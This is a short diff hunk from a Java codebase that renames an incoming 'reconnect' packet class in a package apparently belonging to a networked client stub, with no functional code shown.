@@ -2,7 +2,7 @@ package com.redpois0n.stub.packets.incoming;
 
 import com.redpois0n.Connection;
 
-public class PacketRECONNECT extends AbstractIncomingPacket {
+public class Packet45Reconnect extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
